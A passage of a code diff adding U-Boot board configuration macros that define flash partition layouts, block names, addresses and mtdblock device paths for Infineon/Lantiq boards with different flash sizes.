+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"      \
+        "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME         "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR         0x00010000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x00050000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x007EDFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x007EE000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x007FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x007FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x007FEFFF
+
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME          "fwdiag"
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_START_ADDR          0x007FF000
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_SIZE                0x400
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_END_ADDR            0x007FF3FF
+  
+ 
+  #define IFX_CFG_FLASH_END_ADDR                          0x007FFFFF
+  
+#elif (IFX_CONFIG_FLASH_SIZE == 128)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00040000\0"                                      \
+        "part2_begin=0x000C0000\0"                                      \
+        "part3_begin=0x002C0000\0"                                      \
+        "part4_begin=0x07000000\0"                                      \
+        "part5_begin=0x07040000\0"                                      \
+        "part6_begin=0x07080000\0"                                      \
+        "total_part=7\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"      \
+        "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME         "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR         0x00040000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x000C0000
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x002C0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0x06D40000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock3"
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x07000000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x40000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x0703FFFF
+  #define IFX_CFG_FLASH_SYSTEM_CFG_MTDBLOCK_NAME          "/dev/mtdblock4"
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x07040000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x10000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x0704FFFF
+  #define IFX_CFG_FLASH_UBOOT_CFG_MTDBLOCK_NAME           "/dev/mtdblock5"
+
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME          "fwdiag"
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_START_ADDR          0x07080000
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_SIZE                0x40000
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_END_ADDR            0x070BFFFF
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_MTDBLOCK_NAME       "/dev/mtdblock6"
+
+  #define IFX_CFG_FLASH_END_ADDR                          0x07FFFFFF
+#elif (IFX_CONFIG_FLASH_SIZE == 512)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00040000\0"                                      \
+        "part2_begin=0x000C0000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"      \
+        "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME         "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR         0x00040000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x000C0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x007EDFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x007EE000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x007FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x007FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x10000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x007FEFFF
+
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME          "fwdiag"
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_START_ADDR          0x007FF000
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_SIZE                0x400
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_END_ADDR            0x007FF3FF
+  
+ 
+  #define IFX_CFG_FLASH_END_ADDR                          0x007FFFFF
+
+
+
+#else
+  #error "ERROR!! Define flash size first!"
+#endif
+
+#endif /*CONFIG_FIRMWARE_IN_ROOTFS*/
+
+
+#endif /*CONFIG_BOOT_FROM_SPI*/
+
+
+/* End of Board specific configurations
+ *-----------------------------------------------------------------------
+ */
+
+/*************************************************************************/
+
